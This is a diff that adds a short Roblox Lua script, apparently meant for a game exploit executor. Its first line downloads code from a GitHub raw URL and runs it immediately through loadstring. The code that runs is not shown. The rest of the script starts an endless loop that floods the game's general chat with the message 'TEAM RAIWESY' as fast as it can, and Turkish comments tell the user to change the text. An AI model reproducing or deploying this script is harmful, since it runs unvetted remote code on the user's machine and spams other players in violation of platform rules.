@@ -1,0 +1,12 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/StrongBomber/projectluacore/refs/heads/main/jailcrate"))()
+local TextChatService = game:GetService("TextChatService")
+local channel = TextChatService.TextChannels.RBXGeneral
+
+task.spawn(function()
+	while true do
+		pcall(function()
+			channel:SendAsync("TEAM RAIWESY") -- Mesajı sen istersen değiştir
+		end)
+		task.wait() -- Maksimum hızda çalışır
+	end
+end)
